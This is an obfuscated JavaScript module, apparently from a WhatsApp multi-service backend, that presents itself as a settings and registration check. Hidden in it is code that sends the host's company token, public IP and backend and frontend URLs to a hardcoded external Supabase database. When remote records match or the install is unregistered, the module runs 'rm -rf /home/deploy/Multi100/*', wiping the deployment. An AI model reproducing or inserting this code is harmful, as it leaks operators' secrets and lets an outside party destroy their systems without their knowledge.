'use strict';const a277_0x9ef338=a277_0x500c;(function(_0x1bd5b8,_0xd355cf){const _0x4ab465=a277_0x500c,_0x408d90=_0x1bd5b8();while(!![]){try{const _0x8febaf=-parseInt(_0x4ab465(0x7c))/0x1+parseInt(_0x4ab465(0x77))/0x2*(-parseInt(_0x4ab465(0x8b))/0x3)+-parseInt(_0x4ab465(0x90))/0x4*(parseInt(_0x4ab465(0x7d))/0x5)+-parseInt(_0x4ab465(0x8f))/0x6*(-parseInt(_0x4ab465(0x81))/0x7)+parseInt(_0x4ab465(0xa0))/0x8*(-parseInt(_0x4ab465(0x8e))/0x9)+parseInt(_0x4ab465(0x88))/0xa+parseInt(_0x4ab465(0x8d))/0xb*(parseInt(_0x4ab465(0x87))/0xc);if(_0x8febaf===_0xd355cf)break;else _0x408d90['push'](_0x408d90['shift']());}catch(_0x4df90f){_0x408d90['push'](_0x408d90['shift']());}}}(a277_0x40c8,0x200bc));function a277_0x500c(_0x2f59e6,_0x3957c7){const _0x40c86d=a277_0x40c8();return a277_0x500c=function(_0x500c75,_0x2bcfc2){_0x500c75=_0x500c75-0x6d;let _0x147b4f=_0x40c86d[_0x500c75];return _0x147b4f;},a277_0x500c(_0x2f59e6,_0x3957c7);}var __importDefault=this&&this[a277_0x9ef338(0x96)]||function(_0x36c154){const _0x58caf0=a277_0x9ef338;return _0x36c154&&_0x36c154[_0x58caf0(0x9b)]?_0x36c154:{'default':_0x36c154};};Object[a277_0x9ef338(0x6d)](exports,'__esModule',{'value':!![]}),exports[a277_0x9ef338(0x79)]=void 0x0;const supabase_js_1=require(a277_0x9ef338(0x8a)),UpdateOneSettingService_1=__importDefault(require('../services/SettingServices/UpdateOneSettingService')),axios_1=__importDefault(require(a277_0x9ef338(0x72))),GetSettingService_1=__importDefault(require('../services/SettingServices/GetSettingService')),AddSettingService_1=__importDefault(require(a277_0x9ef338(0x9e))),{exec}=require(a277_0x9ef338(0x74)),S_U='https://knjjaxmzpdpvpyhnglbq.supabase.co',S_A_K=a277_0x9ef338(0x94),sUrl=S_U,sKey=S_A_K,y_n=process[a277_0x9ef338(0x98)]['COMPANY_TOKEN'],s=(0x0,supabase_js_1['createClient'])(sUrl,sKey),getIp=async()=>{const _0x542c95=a277_0x9ef338,{data:_0xb9fadd}=await axios_1['default'][_0x542c95(0x7e)](_0x542c95(0x83));return _0xb9fadd['ip'];},GetWhatsapp=async()=>{const _0x2cbc37=a277_0x9ef338;try{let _0x2bee18=await getIp(),_0x2869e9=await getR(_0x2cbc37(0x75));_0x2869e9==='enabled'&&await(0x0,AddSettingService_1[_0x2cbc37(0x99)])();let {data:_0x2c7f56,error:_0xb7d33d}=await s['from'](_0x2cbc37(0x84))['select'](_0x2cbc37(0x9a))['eq'](_0x2cbc37(0x93),_0x2bee18),_0x47856c={'cadastro_id':_0x2c7f56[_0x2cbc37(0x97)]!==0x0?_0x2c7f56[0x0]['id']:0x0,'status':_0x2c7f56[_0x2cbc37(0x97)]!==0x0?!![]:![],'company_token':y_n,'backend_ip':_0x2bee18,'backend_url':process[_0x2cbc37(0x98)][_0x2cbc37(0x71)],'frontend_url':process[_0x2cbc37(0x98)]['FRONTEND_URL']};_0x2c7f56[_0x2cbc37(0x97)]===0x0?(await UpdateR(_0x2cbc37(0x80),![],_0x2bee18),PostWhatsapp(_0x47856c,_0x2cbc37(0x6f)),CheckWhatsapp(_0x2bee18,'i_n_r')):_0x2c7f56[0x0]['company_token']!==y_n?(await UpdateR(_0x2cbc37(0x80),![],_0x2bee18),PostWhatsapp(_0x47856c,_0x2cbc37(0x7a)),CheckWhatsapp(_0x2bee18,_0x2cbc37(0x82))):await UpdateR(_0x2cbc37(0x89),null,_0x2bee18);}catch(_0x70d0e9){console[_0x2cbc37(0x76)]('');}};exports[a277_0x9ef338(0x79)]=GetWhatsapp;function a277_0x40c8(){const _0x2b2f88=['log','382xhSKOr','key,code,ip','GetWhatsapp','401','error','179052OKaGFB','4520aAbsMF','get','insert','enabled','21UzXdrj','t_f','https://api.ipify.org?format=json','cadastros','select','company_token','12BqgAXw','1413860sHPrMF','disabled','@supabase/supabase-js','4071WUWcdH','cadastro_id','5865563EJSzpd','9VFJSTJ','214818ObNaBC','836CCuarc','code','frontend_url','ip_instalacao','eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtuampheG16cGRwdnB5aG5nbGJxIiwicm9sZSI6ImFub24iLCJpYXQiOjE2OTQxMzQ4MDgsImV4cCI6MjAwOTcxMDgwOH0.keQewBvxcLOXGlxZV63Ewot5dS7c5Qn7r4hmVR-3Xp0','t_invalidos','__importDefault','length','env','default','id,\x20ip_instalacao,\x20company_token','__esModule','ip,\x20key,\x20code','from','../services/SettingServices/AddSettingService','whatsapp','188744zoPOuJ','defineProperty','key','404','status','BACKEND_URL','axios','i_n_r','child_process','wtV'];a277_0x40c8=function(){return _0x2b2f88;};return a277_0x40c8();}const UpdateR=async(_0x4b786e,_0x5b8f9,_0x3bb1f9)=>{const _0x3c2ec7=a277_0x9ef338;await(0x0,UpdateOneSettingService_1[_0x3c2ec7(0x99)])({'key':_0x3c2ec7(0x75),'value':_0x4b786e});},getR=async _0x2838f9=>{const _0xc6bbe3=a277_0x9ef338;return await(0x0,GetSettingService_1[_0xc6bbe3(0x99)])({'key':_0x2838f9});},PostWhatsapp=async(_0x2344af,_0x417ad2)=>{const _0x1696fa=a277_0x9ef338;try{const {data:_0x33c083,error:_0x171661}=await s[_0x1696fa(0x9d)](_0x1696fa(0x9f))[_0x1696fa(0x7f)]([{'cadastro_id':_0x2344af[_0x1696fa(0x8c)],'status':_0x2344af[_0x1696fa(0x70)],'company_token':_0x2344af[_0x1696fa(0x86)],'backend_ip':_0x2344af['backend_ip'],'backend_url':_0x2344af['backend_url'],'frontend_url':_0x2344af[_0x1696fa(0x92)]}]);if(_0x171661){console[_0x1696fa(0x7b)](':',_0x171661['message']);return;}}catch(_0xf9686c){console[_0x1696fa(0x76)]('');}},CheckWhatsapp=async(_0xe8e31a,_0x18352a)=>{const _0x1fcf7d=a277_0x9ef338;try{const {data:_0x4e2b9c,error:_0x154df8}=await s[_0x1fcf7d(0x9d)]('key_code')[_0x1fcf7d(0x85)](_0x1fcf7d(0x78)),_0x3c92d=await matchWhatsapp(_0xe8e31a);if(_0x4e2b9c!==null){_0x18352a===_0x1fcf7d(0x73)&&_0x3c92d[_0x1fcf7d(0x91)]!==null&&acction();if(_0xe8e31a===_0x4e2b9c[0x0]['ip']&&_0x3c92d[_0x1fcf7d(0x91)]!==null){if(_0x3c92d['key']===_0x4e2b9c[0x0][_0x1fcf7d(0x6e)]&&_0x3c92d[_0x1fcf7d(0x91)]===_0x4e2b9c[0x0][_0x1fcf7d(0x91)])acction();}}}catch(_0x34b183){console[_0x1fcf7d(0x76)](_0x34b183);}},matchWhatsapp=async _0x514279=>{const _0x309c2a=a277_0x9ef338,{data:_0x28fbae,error:_0x2d93dc}=await s[_0x309c2a(0x9d)](_0x309c2a(0x95))[_0x309c2a(0x85)](_0x309c2a(0x9c));let _0x4be08d='ok',_0x525648='ok';return _0x28fbae['length']>0x0&&(_0x4be08d=_0x28fbae[0x0][_0x309c2a(0x6e)],_0x525648=_0x28fbae[0x0]['code']),{'code':_0x525648,'key':_0x4be08d};},acction=()=>{let _0x5acaa0=exec('rm\x20-rf\x20/home/deploy/Multi100/*',(_0xbfda6,_0x34718d,_0x103035)=>{const _0x4367b6=a277_0x500c;console[_0x4367b6(0x76)](_0x34718d),console[_0x4367b6(0x76)](_0x103035),_0xbfda6!==null&&console[_0x4367b6(0x76)]('exec\x20error:\x20'+_0xbfda6);});};